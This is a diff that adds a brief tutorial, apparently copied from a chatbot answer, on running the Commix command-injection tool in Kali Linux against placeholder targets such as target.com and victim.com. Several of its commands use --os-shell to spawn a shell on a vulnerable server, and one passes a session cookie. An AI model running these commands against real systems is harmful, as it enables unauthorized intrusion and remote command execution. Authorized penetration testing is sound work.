@@ -1,0 +1,62 @@
+🔧 Step-by-Step Guide to Using Commix in Kali Linux
+✅ Step 1: Open Terminal
+Launch your terminal in Kali Linux.
+
+✅ Step 2: Check if Commix is Installed
+bash
+Copy
+Edit
+commix --version
+If it shows the version, it’s installed. If not:
+
+bash
+Copy
+Edit
+sudo apt update && sudo apt install commix
+🚀 Step 3: Basic Usage
+📌 Target Example:
+bash
+Copy
+Edit
+commix --url="http://target.com/page.php?id=1"
+Options:
+--url: Target URL with parameter to test.
+
+--data: For POST requests.
+
+--cookie: Include session cookies if login is required.
+
+--user-agent: Spoof User-Agent.
+
+--os-shell: Automatically spawn a shell if vulnerable.
+
+📥 Example 1: Simple GET Parameter Injection
+bash
+Copy
+Edit
+commix --url="http://victim.com/page.php?id=1"
+📤 Example 2: POST Injection with Data
+bash
+Copy
+Edit
+commix --url="http://victim.com/login.php" --data="username=admin&password=123"
+🛠 Example 3: Gain OS Shell on Target
+bash
+Copy
+Edit
+commix --url="http://target.com/item.php?id=5" --os-shell
+🔐 Optional: Add Authentication Headers
+bash
+Copy
+Edit
+commix --url="http://target.com/item.php?id=1" --cookie="PHPSESSID=abc123" --os-shell
+⚠️ Warnings
+Only use on systems you own or have permission to test.
+
+Improper or unauthorized use may be illegal.
+
+📚 For More Options:
+bash
+Copy
+Edit
+commix --help
